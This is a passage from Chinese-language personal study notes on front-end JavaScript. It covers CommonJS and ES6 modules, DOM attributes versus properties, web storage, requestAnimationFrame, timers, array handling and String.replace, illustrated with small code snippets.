true\n```\n仔细说明一下整个过程。\n\n在Node.js中执行c模块。此时遇到require关键字，执行a.js中所有代码。\n在a模块中exports之后，通过require引入了b模块，执行b模块的代码。\n在b模块中exports之后，又require引入了a模块，此时执行a模块的代码。\na模块只执行exports.done = false这条语句。\n回到b模块，打印b.js-1, exports, b.js-2。b模块执行完毕。\n回到a模块，接着打印a.js-1, exports, b.js-2。a模块执行完毕\n回到c模块，接着执行require，需要引入b模块。由于在a模块中已经引入过了，所以直接就可以输出值了。\n结束。\n从以上结果和分析过程可以看出，当遇到require命令时，会执行对应的模块代码。当循环引用时，有可能只输出某模块代码的一部分。当引用同一个模块时，不会再次加载，而是获取缓存。\n\n## ES6模块\n**ES6模块化语法**\nES6模块功能主要有两个命令构成：export和import\n- export命令用于规定模块的的对外接口\n- import命令用于输入其他模块提供的功能\n\nmodule.js文件\n```js\n//方法一：分别暴露\nexport let school = \"HNUST\"\nexport function teach(){\n  console.log(\"i am a teacher\");\n}\n\n//方法二：统一暴露\nschool1 = \"HNUST\"\nfunction teach1(){\n  console.log(\"i am a teacher\");\n}\nexport {school, teacher1}\n\n//方法三：默认暴露\nexport default{\n  school2:\"HNUST\",\n  teach2: function(){\n    console.log(\"i am a teacher\");\n  }\n}\n```\ntest.js文件\n```js\n//方法一：通用的导入方式\nimport * as m1 from \"./module.js\"\nconsole.log(m1.school) //输出：HNUST\nm1.teach() //输出：i am a teacher\n\n//方法二：解构赋值形式\nimport {school1 as schoolAlias, teach1} from './module.js'\nimport {default as m3} from 'module.js' //引入默认暴露的模块必须要别名\nconsole.log(schoolAlias) //输出：HNUST\nteach1() //输出：i am a teacher\n\n//方法三：简便形式，只用于默认暴露\nimport m4 from './module.js'\nconsole.log(m4)\n```\n在一个模块中，`export default`只允许向外暴露1次。\n在一个模块中，可以同时使用`export defalut`和`export`向外暴露，并且`export`可以向外暴露n次\n**注：node现在还不支持import语法**\n\nes6模块中的值属于【动态只读引用】。只说明一下复杂数据类型。\n对于只读来说，即不允许修改引入变量的值，import的变量是只读的，不论是基本数据类型还是复杂数据类型。当模块遇到import命令时，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。\n对于动态来说，原始值发生变化，import加载的值也会发生变化。不论是基本数据类型还是复杂数据类型。\n```js\n// b.js\nexport let counter = {\n  count: 1\n}\nsetTimeout(() => {\n  console.log('b.js-1', counter.count)\n}, 1000)\n\n// a.js\nimport { counter } from './b.js'\ncounter = {}\nconsole.log('a.js-1', counter)\n\n// Syntax Error: \"counter\" is read-only\n```\n虽然不能将counter重新赋值一个新的对象，但是可以给对象添加属性和方法。此时不会报错。这种行为类似与关键字const的用法。\n```js\n// a.js\nimport { counter } from './b.js'\ncounter.count++\nconsole.log(counter)\n\n// 2\n循环加载时，ES6模块是动态引用。只要两个模块之间存在某个引用，代码就能够执行。\n// b.js\nimport {foo} from './a.js';\nexport function bar() {\n  console.log('bar');\n  if (Math.random() > 0.5) {\n    foo();\n  }\n}\n\n// a.js\nimport {bar} from './b.js';\nexport function foo() {\n  console.log('foo');\n  bar();\n  console.log('执行完毕');\n}\nfoo();\n\nbabel-node a.js\nfoo\nbar\n执行完毕\n\n// 执行结果也有可能是\nfoo\nbar\nfoo\nbar\n执行完毕\n执行完毕\n```\n由于在两个模块之间都存在引用。因此能够正常执行。\n\n# 钩子函数\n在一个有序的步骤中的特殊位置(挂载点)，插入自定义的内容。这就叫\"钩子\"。\n钩子函数：钩子函数是在一个事件触发的时候，在系统级捕获到了他，然后做一些操作。一段用以处理系统消息的程序。“钩子”就是在某个阶段给你一个做某些处理的机会。\n\n钩子函数： 1、是个函数，在系统消息触发时被系统调用 2、不是用户自己触发的\n\n钩子函数的名称是确定的，当系统消息触发，自动会调用。例如react的componentWillUpdate函数，用户只需要编写componentWillUpdate的函数体，当组件状态改变要更新时，系统就会调用componentWillUpdate。\n\n常见的钩子函数：\nreact的生命周期函数、vue的生命周期函数，vue的自定义指令等\n\n# attribute和property的区别\nproperty 和 attribute非常容易混淆，两个单词的中文翻译也都非常相近（property：属性，attribute：特性），但实际上，二者是不同的东西，属于不同的范畴。\n在英文系统里，右键单击一个文件，显示是property（中文系统里对应的是\"属性“），会显示文件的大小、创建日期等等，这些你是没办法去改变的（当然，你也可以改，但是改就是另外一个文件）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110250.png)\n\n而文件“只读”，“隐藏”是算在attribute的，你可以改变他的只读、隐藏属性，不过文件本身不会有变化。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110300.png)\n\n所以这么理解，property是 物体本身自带属性，不能改变的（一旦改了就是另外一个东西了）attribute，由于 attribute还可以做动词，表示赋予。。。特性，属于人为赋予的可改变的属性。比如，你的头发，可以人为拉直、弯曲，但不管怎么样，都是你的头发，这叫做头发的attribute。但是头发的弹性、硬度，这些没办法改变，改了就不是头发了，这是property.\n\n- property是DOM中的属性，是JavaScript里的对象；\n- attribute是HTML标签上的特性，它的值只能够是字符串；\n\n有以下代码：\n```html\n<div id=\"div1\" class=\"divClass\" title=\"divTitle\" title1=\"divTitle1\"></div>\n\nvar in1=document.getElementById(\"div1\");\nconsole.log(in1);\n```\n对于id为div1的div，它的property内容如下：（部分）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110312.png)\n\n可以发现有一个名为“attributes”的属性，类型是NamedNodeMap; 同时有“id”和“className”、”title“等基本的属性，但没有“title1”这个自定义的属性。\n```js\nconsole.log(in1.id);          //div1\nconsole.log(in1.className);        //divClass\nconsole.log(in1.title);          //divTitle\nconsole.log(in1.title1);       //undefined\n```\n可以发现，标签中的属性，“id”和“className”、”title“会在in1上创建，而“title1”不会被创建。这是由于，每一个DOM对象都会有它默认的基本属性，而在创建的时候，它只会创建这些基本属性，我们在TAG标签中自定义的属性是不会直接放到DOM中的。\n\n那自定义的”title1“去哪里了呢？在attributes属性里可以看到如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110353.png)\n\n“title1”被放在了attributes这个对象里，这个对象按顺序记录了我们在TAG中定义的属性和属性的数量。\n\n从这里就可以看出，**attributes是属于property的一个子集**，它保存了HTML标签上定义属性。如果再进一步探索attitudes中的每一个属性，会发现它们并不是简单的对象，它是一个Attr类型的对象，拥有NodeType、NodeName等属性。关于这一点，稍后再研究。注意，打印attribute属性不会直接得到对象的值，而是获取一个包含属性名和值的字符串，如：\n```js\nconsole.log(in1.attibutes.title1);        // divTitle1\n```\n由此可以得出：\n- HTML标签中定义的属性和值会保存该DOM对象的attributes属性里面；\n- 这些attribute属性的JavaScript中的类型是Attr，而不仅仅是保存属性名和值这么简单；\n\n再如下：\n```html\n<input id=\"in_2\">\n```\n在它的property中有如下部分：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110405.png)\n\n尽管我们没有在TAG中定义“value”，但由于它是DOM默认的基本属性，在DOM初始化的时候它照样会被创建。\n\n## “脚踏两只船”\n常用的Attribute，例如id、class、title等，已经被作为Property附加到DOM对象上，可以和Property一样取值和赋值。但是自定义的Attribute，就不会有这样的特殊优待，例如：\n```html\n<div id=\"div1\" class=\"divClass\" title=\"divTitle\" title1=\"divTitle1\">100</div>\n```\n这个div里面的“title1”就不会变成Property。\n即，**只要是DOM标签中出现的属性（html代码），都是Attribute**。然后有些常用特性（id、class、title等），会被转化为Property。可以很形象的说，这些特性/属性，是“脚踏两只船”的。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110415.png)\n\n最后注意：“class”变成Property之后叫做“className”，因为“class”是ECMA的关键字。\n\n## attribute和property的取值和赋值\n### attribute取值\n《js高级程序设计》中提到，为了方便操作，建议大家用setAttribute()和getAttribute()来操作即可。\n```html\n <div id=\"div1\" class=\"divClass\" title=\"divTitle\" align=\"left\" title1=\"divTitle1\"></div>\n \n var id = div1.getAttribute(\"id\");              \n var className1 = div1.getAttribute(\"class\");\n var title = div1.getAttribute(\"title\");\n var title1 = div1.getAttribute(\"title1\");   //自定义特性\n```\ngetAttribute()可以取得任何特性，不管是标准的还是自定义的。\n但是这个方法的浏览器兼容性有问题，有些浏览器可能会获取属性Property的值，因此jQuery要做一个测试，看getAttribute()是否是绝对获取特性Attribute的值。\n```js\ndiv1.className = 'a';\nvar judge = div1.getAttribute(\"className\") === 'a';\n```\n如果以上代码成立，说明getAttribute()方法出现了问题，将不再使用。\n\n### attribute赋值\n```js\ndiv1.setAttribute('class', 'a');\ndiv1.setAttribute('title', 'b');\ndiv1.setAttribute('title1', 'c');\ndiv1.setAttribute('title2', 'd');\n```\n用setAttrbute()赋值，任何Attribute都可以，包括自定义的。而且，赋值的Attribute会立刻表现到DOM元素上。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409113227.png)\n\n如果是标准特性，也会更新它们关联的属性的值：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409113237.png)\n\n**最后注意，setAttribute()的两个参数**，都必须是字符串。即对特性Attribute职能赋值字符串，而对属性Property就可以赋任何类型的值了。\n\n### property取值\n属性取值很简单。取任何属性的只，用`.`就可以：\n```js\nvar id = div1.id;\nvar className = div1.className;\nvar childNodes = div1.childNodes;\nvar attrs = div1.attributes;\n```\n此处再次强调：\n- class特性在变成属性时，名字改成了“className”，因此div1.className和div1.getAttrbute('class')相同。\n- 上面代码中的div1.attributes是取的attributes这一属性，取出来保存到attrs变量中，attrs就成了一个NamedNodeList类型的对象，里面存储了若干个Attr类型。\n\n### Property赋值\n赋值和基本的js对象属性赋值一样，用“.”即可：\n```js\ndiv1.className = 'a';\ndiv1.align = 'center';\ndiv1.AAAAA = true;\ndiv1.BBBBB = [1, 2, 3];\n```\n**对属性Property可以赋任何类型的值，而对特性Attribute只能赋值字符串！**\n\n### property和attribute数据同步问题\n```js\nin1.value='new value of prop';\n\nconsole.log(in1.value);               // 'new value of prop'\nconsole.log(in1.attributes.value);         // 'value=\"1\"'\n```\n此时，页面中的输入栏的值变成了“new value of prop”，而propety中的value也变成了新的值，但attributes却仍然是“1”。从这里可以推断，property和attribute的同名属性的值并不是双向绑定的。\n\n如果反过来，设置attitudes中的值，效果会怎样呢？\n```js\nin2.setAttribute('value','ni')\nconsole.log(in2.value);          //ni\nconsole.log(in2.attributes.value); //value='ni'\n```\n由此，可得出结论：\n- property能够从attribute中得到同步；\n- attribute不会同步property上的值；\n- attribute和property之间的数据绑定是单向的，attribute->property；\n- 更改property和attribute上的任意值，都会将更新反映到HTML页面中；\n\n# localStorage与sessionStorage\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409113247.png)\n\n## localStorage\nlocalStorage是HTML5新增的特性，这个特性主要是用来本地存储的，解决了Cookie存储空间不足的问题(Cookie中每条Cookie的存储空间为4k)，localStorage存储的内存大小是5M左右。\n\nlocalStorage是本地永久存储，数据被存放在本地硬盘中，关掉浏览器数据不会被清除，在同一个浏览器的不同tab页中，localStorage是共享的，但是不同的浏览器存储的localStorage是不共享的，也就是说使用Chrome浏览器存储的localStorage在IE中是不能使用的。\n\n### localStorage的用法\nlocalStorage只能用来存储字符串。\n```js\nlocalStorage.setItem(\"name\", \"lisi\"); //存储name = \"lisi\"。\nlocalStorage.getItem(\"name\");  // 获取name的值。\nlocalStorage.removeItem(\"name\");  //将name移除。\n```\n当localStorage要存储对象时，需要先将对象转化为json字符串进行存储。\n```js\nvar user= {\"name\" : \"lisi\"; \"age\" : \"24\"};\nlocalStorage.setItem(\"user\", JSON.stringify(user));  //JSON.stringify(user)是将user对象转化为json字符串。\nvar user = JSON.parse(localStorage.getItem(\"user\")) //将取出的json字符串转化为对象。\n```\n## sessionStorage\n和localStorage一样，sessionStorage也是HTML5新增的特性，也是用来本地存储数据的，不同的是localStorage是本地永久存储，sessionStorage存储的数据只有在同一个会话中才能被访问，关闭浏览器数据就会被清除。sessionStorage存储的数据是不能跨进程的，也就是在同一个浏览器的不同tab页中，sessionStorage不是共享的。sessionStorage数据存储在浏览器内存中，因此关闭浏览器数据就会被清除。\n\n### sessionStorage用法。\n和localStorage的用法相似，sessionStorage也只能存储字符串。\n```js\nsessionStorage.setItem(\"name\",\"lisi\"); //存储name = \"lisi\"。\nsessionStorage.getItem(\"name\");  // 获取name的值。\nsessionStorage.removeItem(\"name\");  //将name移除。\n```\n当sessionStorage要存储对象时。\n```js\nvar user= {\"name\" : \"lisi\"; \"age\" : \"24\"};\nsessionStorage.setItem(\"user\",JSON.stringify(user));  //JSON.stringify(user)是将user对象转化为json字符串。\nvar user = JSON.parse(sessionStorage.getItem(\"user\")) //将取出的json字符串转化为对象。\n```\n\n# requestAnimationFrame\n## 概述\nrequestAnimationFrame是浏览器用于定时循环操作的一个接口，类似于setTimeout，主要用途是按帧对网页进行重绘。\n\n设置这个API的目的是为了让各种网页动画效果（DOM动画、Canvas动画、SVG动画、WebGL动画）能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果。代码中使用这个API，就是告诉浏览器希望执行一个动画，让浏览器在下一个动画帧安排一次网页重绘。\n\nrequestAnimationFrame的优势，在于充分利用显示器的刷新机制，比较节省系统资源。显示器有固定的刷新频率（60Hz或75Hz），也就是说，每秒最多只能重绘60次或75次，requestAnimationFrame的基本思想就是与这个刷新频率保持同步，利用这个刷新频率进行页面重绘。此外，使用这个API，一旦页面不处于浏览器的当前标签，就会自动停止刷新。这就节省了CPU、GPU和电力。\n\n不过有一点需要注意，requestAnimationFrame是在主线程上完成。这意味着，如果主线程非常繁忙，requestAnimationFrame的动画效果会大打折扣。\n\nrequestAnimationFrame使用一个回调函数作为参数。这个回调函数会在浏览器重绘之前调用。\n```js\nrequestID = window.requestAnimationFrame(callback); \n```\n目前，主要浏览器Firefox 23 / IE 10 / Chrome / Safari）都支持这个方法。可以用下面的方法，检查浏览器是否支持这个API。如果不支持，则自行模拟部署该方法。\n```js\n window.requestAnimFrame = (function(){\n      return  window.requestAnimationFrame       || \n              window.webkitRequestAnimationFrame || \n              window.mozRequestAnimationFrame    || \n              window.oRequestAnimationFrame      || \n              window.msRequestAnimationFrame     || \n              function( callback ){\n                window.setTimeout(callback, 1000 / 60);\n              };\n    })();\n```\n上面的代码按照1秒钟60次（大约每16.7毫秒一次），来模拟requestAnimationFrame。\n\n使用requestAnimationFrame的时候，只需反复调用它即可。\n```js\nfunction repeatOften() {\n  // Do whatever\n  requestAnimationFrame(repeatOften);\n}\n\nrequestAnimationFrame(repeatOften);\n```\n\n## cancelAnimationFrame方法\ncancelAnimationFrame方法用于取消重绘。\n```js\nwindow.cancelAnimationFrame(requestID);\n```\n它的参数是requestAnimationFrame返回的一个代表任务ID的整数值。\n```js\nvar globalID;\n\nfunction repeatOften() {\n  $(\"<div />\").appendTo(\"body\");\n  globalID = requestAnimationFrame(repeatOften);\n}\n\n$(\"#start\").on(\"click\", function() {\n  globalID = requestAnimationFrame(repeatOften);\n});\n\n$(\"#stop\").on(\"click\", function() {\n  cancelAnimationFrame(globalID);\n});\n```\n上面代码持续在body元素下添加div元素，直到用户点击stop按钮为止。\n\n## 实例\n下面，举一个实例。\n\n假定网页中有一个动画区块。\n```html\n<div id=\"anim\">点击运行动画</div> \n```\n然后，定义动画效果。\n```js\nvar elem = document.getElementById(\"anim\");\n\nvar startTime = undefined;\n \nfunction render(time) {\n \n  if (time === undefined)\n    time = Date.now();\n  if (startTime === undefined)\n    startTime = time;\n \n  elem.style.left = ((time - startTime)/10 % 500) + \"px\";\n}\n```\n最后，定义click事件。\n```js\nelem.onclick = function() {\n\n    (function animloop(){\n      render();\n      requestAnimFrame(animloop);\n    })();\n\n};\n```\n\n# JS合并两个数组的方法\n我们在项目过程中，有时候会遇到需要将两个数组合并成为一个的情况。\n比如：\n```js\nvar a = [1,2,3];\nvar b = [4,5,6];\n```\n有两个数组a、b，需求是将两个数组合并成一个。方法如下：\n\n**1. concat**\njs的Array对象提供了一个叫concat()方法，连接两个或更多的数组，并返回结果。\n```js\nvar c = a.concat(b);//c=[1,2,3,4,5,6]\n```\n这里有一个问题，concat方法连接a、b两个数组后，a、b两个数组的数据不变，同时会返回一个新的数组。这样当我们需要进行多次的数组合并时，会造成很大的内存浪费，所以这个方法肯定不是最好的。\n\n**2. for循环**\n大概的思路是：遍历其中一个数组，把该数组中的所有元素依次添加到另外一个数组中。直接上代码：\n```js\nfor(var i in b){\n    a.push(b[i]);\n}\n```\n这样的写法可以解决第一种方案中对内存的浪费，但是会有另一个问题：丑！这么说不是没有道理，如果能只用一行代码就搞定，岂不快哉~\n\n**3. apply**\n函数的apply方法有一个特性，那就是func.apply(obj,argv)，argv是一个数组。所以我们可以利用这点，直接上代码：\n```js\na.push.apply(a,b);\n```\n调用a.push这个函数实例的apply方法，同时把，b当作参数传入，这样a.push这个方法就会遍历b数组的所有元素，达到合并的效果。\n这里可能有点绕，我们可以把b看成[4,5,6]，变成这样：\n```js\na.push.apply(a,[4,5,6]);\n```\n然后上面的操作就等同于：\n```js\na.push(4,5,6);\n```\n这样就很清楚了！\n另外，还要注意两个小问题：\n1）以上3种合并方法并没有考虑过a、b两个数组谁的长度更小。\n所以好的做法是预先判断a、b两个数组哪个更大，然后使用大数组合并小数组，这样就减少了数组元素操作的次数！\n2）有时候我们不希望原数组（a、b）改变，这时就只能使用concat了。\n\n# 零碎知识点\n## 有关js如何获取先前的URL的问题\n首先可以通过如下方法来跳转到前一个页面\n```js\nhistory.go(-1)\nhistory.back()\n```\n但是如果我们只是想要得到前一个页面的url。我们该怎么做？\n答案就是不能获取到， 因为出于安全和隐式原因，是不能访问到前一个页面的url的\n而有关于网上说的`document.referer`方法， 这方法不是获取前一个页面的url\n\n## js获取手机端屏幕大小\n```js\nvar w = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;\nvar h = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;\n```\n\n## js获取上传文件内容\n```html\n<div>\n    上传文件 ： <input type=\"file\" name = \"file\" id = \"fileId\" /> \n    \n    <button  type = \"submit\" name = \"btn\" value = \"提交\" id = \"btnId\" onclick=\"check()\" /> 提交\n</div>\n\n<script>\n\n    function check() {\n        \n        var objFile = document.getElementById(\"fileId\");\n        if(objFile.value == \"\") {\n            alert(\"不能空\")\n        }\n    \n        console.log(objFile.files[0].size); // 文件字节数\n        \n        var files = $('#fileId').prop('files');//获取到文件列表\n        if(files.length == 0){\n            alert('请选择文件');\n        }else{\n            var reader = new FileReader();//新建一个FileReader\n            reader.readAsText(files[0], \"UTF-8\");//读取文件 \n            reader.onload = function(evt){ //读取完文件之后会回来这里\n                var fileString = evt.target.result; // 读取文件内容, fileString的类型为String\n        }\n    }\n    \n}\n```\n\n## 清空canvas的方法\n```js\ncanvas.height=canvas.height;\n```\n重新设置canvas的高度时， canvas都会自动清空\n\n## JavaScript中方法或者变量名称前加下划线的是什么意思？\n加下划线不是js要求的，是程序员约定俗成的。\n通常变量前加下划线表示“私有变量”。\n函数名前加下划线表示“私有函数”。\n为什么我加引号，因为“私有”这个词不是js的官方说法，js也根本没有“私有变量”这种东西，只是程序员之间模仿其他有私有变量的语言的一种约定俗成的说法。也就是“你懂的”。\n只为代码维护方便，没特别意义。不是说加了下划线就有本质变化了\n\n在JavaScript的变量名或函数名前加`“_”` 。\n在变量名或函数名前加下划线，一般表示“私有”。是约定俗成的开发规范，没有强制限制，类似于类名首字母大写。\n\n加下划线，还能有效防止重名。\n\n通常变量前加下划线表示“私有变量”。\n函数名前加下划线表示“私有函数”。\n\n## 前端下载文件方式\n前端下载文件常用的三种方式:\n- 第一种是后台提供一个 URL，然后用 window.open(URL) 下载，或者window.location.href（URL）\n- 第二种用a标签\n- 第三种就是后台直接返回文件流，然后前端转化一下再下载。\n\n### 使用a标签\n用户点击下载多媒体文件(图片/视频等)，最简单的方式：\n```html\n<a href='url' download=\"filename.ext\">下载</a>\n```\n\n### 后台返回文件流\n后台返回数据为二进制文件(content-type=\"application/octet-stream\")：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409113304.png)\n\n具体方法：\n```js\naxios({\n        url: '/api/system/file/download/by/fileId',\n        method: 'get',\n        responseType: 'arraybuffer', //由于后台返回来的是文件流，所以设置成arraybuffer, 否则会乱码\n      }).then(res => {\n            var blob = new Blob([res.data], {type: 'application/vnd.ms-excel;charset=utf-8'}); //指定格式为vnd.ms-excel\n            var downloadElement = document.createElement('a');\n            var href = window.URL.createObjectURL(blob);     //创建下载的链接\n            downloadElement.href = href\n            downloadElement.download = '测试文件.xls';      //下载后文件名\n            document.body.appendChild(downloadElement);\n            downloadElement.click();    //点击下载\n            document.body.removeChild(downloadElement);     //下载完成移除元素\n            window.URL.revokeObjectURL(href);     //释放掉blob对象\n      })\n```\n\n\n## 在浏览器控制台中使用js设置焦点失效的问题\n我在web.whatsapp.com(chrome)上尝试相同的输入搜索字段.\n这是我的代码：\n```js\ndocument.getElementsByClassName(\"input input-search\")[0].focus()\ndocument.getElementsByClassName(\"input input-search\")[0].select()\n$(\".input-search\").focus() \n```\n都不起作用， 都不能将光标聚焦到input上\n### 原因：\n由于浏览器控制台的工作方式.运行每个命令后, 控制台将获得焦点， 所以你在chrome 控制台中设置web页面中的某个元素获取焦点的话， 是无效的\n为了解决这个问题， 你可以在执行命令前， 点击一下web页面， 让焦点在web页面上， 而不是在chrome控制台上， 然后执行有关focus（）焦点方法就可以实现\n可以使用如下代码实现：\n```js\nvar input = document.getElemtnsById(\"ff\")\nsetTimeout(function(){\n    input.focus()\n}, 2000)\n```\n这要的话，你在2秒内点击web页面，使焦点脱离chrome控制台，  就可以实现input元素聚焦\n\n**注：不要使用Jquery对象的focus()方法， 这不是触发focus事件， 而是定义focus事件， 应该使用JS对象的focus方法**\n\n# 为什么不推荐使用 setInterval\n解释原因之前需要先简单介绍一下 js 的执行原理：js引擎是单线程的，主要分为主线程和事件队列，同步操作是在主线程上执行，而异步操作的函数会先放在事件队列当中，等到js主线程空闲了，才会去事件队列取出放到主线程执行。定时器是属于异步事件，参数里面设置的时间，并不是延迟多少秒去执行回调函数，这个时间代表的是延迟多少秒，把回调函数放到异步队列，等待主线程空闲再被执行。\n\n如果按照上面的说法，假如同步代码耗时较长就会存在执行多次的问题，举个例子，假如设置一个 100ms 的定时器，定时器中代码需要执行1000ms，那么事件队列中就会添加10次定时器的函数（实际小于10次），这样1s之后会就执行10次代码，而不是我们想要的每隔 100ms 执行一次，对此js引擎解决方法是，当使用setInterval时，仅当没有该定时器的任何其他代码实例时，才将定时器代码添加到队列中。这确保了定时器代码加入到队列中的最小时间间隔为指定间隔。什么意思呢，看如下代码：\n```js\nconsole.time('耗时')\nvar timer = setInterval(() => {\n  for (let i = 0; i < 1100000000; i++) { // 900ms左右\n  }\n  console.log(0)\n}, 100);\n\nsetTimeout(() => {\n  console.log('1s了')\n  clearInterval(timer)\n  console.timeEnd('耗时') // 耗时: 1955.52490234375ms（打印结果不固定）\n}, 1000);\n```\n\n看上去这里应该打印10个0才对，其实只会打印2个0，原因就是如果当事件队列当中，已经存在了定时器的回调函数，即使已经到了规定的间隔时间，也不会再把这个时间点的定时器回调函数放到事件队列当中，定时器依旧运行。当下一个约定时间又到了，如果事件队列当中依然存在定时器的回调函数，这个时间点的定时器回调函数也不会放进事件队列…\n\n这样就会导致一些间隔被跳过了。如果需要每个定时器的回调函数都被执行到，这里就不能满足需求了。\n\n还有一个常用的场景是使用 setInterval 进行ajax请求，如果某一次请求时间过长，就导致下一次甚至多次的请求被忽略掉，这显然是不能接受的。\n\n## 递归setTimeout\n为了避免setInterval()定时器的问题，可以使用递归setTimeout()\n```js\nsetTimeout(function fn(){\n    // 执行业务代码，执行完成后，设定一个任务\n    setTimeout(fn,interval);\n},interval);\n```\n这个模式递归调用了 setTimeout ，每次函数执行的时候都会创建一个新的定时器。第二个setTimeout()调用当前执行的函数，并为其设置另外一个定时器。这样做的好处是，在前一个定时器代码执行完之前，不会向队列插入新的定时器代码，确保不会有任何缺失的间隔。而且，它可以保证在下一次定时器代码执行之前，至少要等待指定的间隔，避免了连续的运行。因此 setTimeout 在某程度上比 setInterval 稳定。但无论是 setTimeout 还是 setInterval 都无法解决精准定时的问题。\n\n例如：\n```vue\nactivated() {\n  this.StopTimer = true;\n  let that = this;\n  setTimeout(function fn() {\n    if (that.StopTimer) {\n      console.log(\"aaaaa\")\n      setTimeout(fn, 1000);\n    }\n  }, 1000)\n},\ndeactivated() {\n  this.StopTimer = false;\n}\n```\n\n## 注意\n在定时器任务中，var timer=setTimeout(function(){})执行后，清除定时任务clearTimeout(timer)和timer=null是有区别的，timer只是一个定时任务的一个标示量，设置为null仅仅是改变了timer变量的值，对设定的任务没有影响，只有通过clearTimeout(timer)才是真的清除定时任务\n\n## 扩展\nHTML5标准规定，setTimeout的最短时间间隔是4毫秒；setInterval的最短间隔时间是10毫秒，也就是说，小于10毫秒的时间间隔会被调整到10毫秒\n\n大多数电脑显示器的刷新频率是60HZ，大概相当于每秒钟重绘60次。因此，最平滑的动画效的最佳循环间隔是1000ms/60，约等于16.6ms\n\n为了节电，对于那些不处于当前窗口的页面，浏览器会将时间间隔扩大到1000毫秒。另外，如果笔记本电脑处于电池供电状态，Chrome和IE10+浏览器，会将时间间隔切换到系统定时器，大约是16.6毫秒\n\n# js遍历数组并原地删除的问题\n最近在项目中遇到，前端获取后台返回的数组后，需要对数组进行加工，删除特定的元素。\n\n这里使用的删除函数是：splice()\n```js\n/**\n * 有效的方式 - 改变下标，控制遍历\n */\nfor (var i = 0; i < arr.length; i++) {\n　　if (...) {\n　　　　arr.splice(i, 1); // 将使后面的元素依次前移，数组长度减1\n　　　　i--; // 如果不减，将漏掉一个元素\n　　}\n}\n\n/**\n * 无效的方式 - for .. in 无法控制遍历\n */\nfor (var i in arr) {\n　　if (...) {\n　　　　arr.splice(i, 1); // 将使后面的元素依次前移，数组长度减1\n　　　　i--; // 没有效果，怎么都会漏掉一个元素\n　　}\n}\n```\n## js 字符串数组转换成数字数组\n```js\n['1','2','3'].map(Number)\n```\n\n# js获取屏幕、浏览器、页面的高度宽度\n本篇主要介绍Web环境中屏幕、浏览器及页面的高度、宽度信息。\n\n## 介绍\n### 容器\n- 一个页面的展示，从外到内的容器为：屏幕、浏览器以及页面本身。\n- HTML元素展现在页面内，页面展现在浏览器内，而浏览器展现在屏幕内。\n- 通过Js的一些对象可以获取这些容器的高度、宽度。\n### 物理尺寸和分辨率\n- 容器的尺寸是指当前分辨率下的高度、宽度，而不是物理高度、宽度。\n- 如：一个22寸的显示器，屏幕分辨率为1366 * 768，那么获取到的屏幕高度为1366px，宽度为768px。\n\n### 展示图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220227161629.png)\n\n注意：图中的body根据HTML的文档渲染模式不同指定的body也不同。\n```js\n// 标准模式时(document.compatMode == 'CSS1Compat')，body = document.documentElement\nvar body = (document.compatMode && document.compatMode == 'CSS1Compat') ? document.documentElement : document.body\n```\n\n## 屏幕信息\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220227161736.png)\n\n```js\nscreen.height ：屏幕高度。\nscreen.width ：屏幕宽度。\nscreen.availHeight ：屏幕可用高度。即屏幕高度减去上下任务栏后的高度，可表示为软件最大化时的高度。\nscreen.availWidth ：屏幕可用宽度。即屏幕宽度减去左右任务栏后的宽度，可表示为软件最大化时的宽度。\n任务栏高/宽度 ：可通过屏幕高/宽度 减去 屏幕可用高/宽度得出。\n如：任务栏高度 = screen.height - screen.availHeight 。\n```\n\n## 浏览器信息\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220227161804.png)\n\n```js\nwindow.outerHeight ：浏览器高度。\nwindow.outerWidth ：浏览器宽度。\nwindow.innerHeight ：浏览器内页面可用高度；此高度包含了水平滚动条的高度(若存在)。可表示为浏览器当前高度去除浏览器边框、工具条后的高度。\nwindow.innerWidth ：浏览器内页面可用宽度；此宽度包含了垂直滚动条的宽度(若存在)。可表示为浏览器当前宽度去除浏览器边框后的宽度。\n工具栏高/宽度 ：包含了地址栏、书签栏、浏览器边框等范围。如：高度，可通过浏览器高度 - 页面可用高度得出，即：window.outerHeight - window.innerHeight。\n```\n\n## 页面信息\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220227161845.png)\n\n```js\ndocument.body.offsetHeight ：body总高度。\ndocument.body.offsetWidth ：body总宽度。\ndocument.body.clientHeight ：body展示的高度；表示body在浏览器内显示的区域高度。\ndocument.body.clientWidth ：body展示的宽度；表示body在浏览器内显示的区域宽度。\n滚动条高度/宽度 ：如高度，可通过浏览器内页面可用高度 - body展示高度得出，即window.innerHeight - body.clientHeight。\n```\n\n# js中replace妙用\n## 使用分组回朔\n|字符|替换文本|\n|--|--|\n|$1、$2、...、$99\t与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。|\n|$&|与 regexp 相匹配的子串。|\n|$`|位于匹配子串左侧的文本。|\n|$'|位于匹配子串右侧的文本。|\n|%|直接量符号。|\n\n实例:\n```js\nconsole.log(\"123-222-bbb\".replace(/(\\d{3})-(\\d{3})-(\\w{3})/g, \"$3$1$1\")) //输出：bbb123123\n```\n\n## 使用回调\n\n```js\n\"123-2##22-b##bb\".replace(/.+/g, function (keyword){\n    return keyword.replaceAll(\"#\", \"*\")\n})\n```\n"
  },
  {
    "title": "./notes/基础知识/docker/Docker.md",
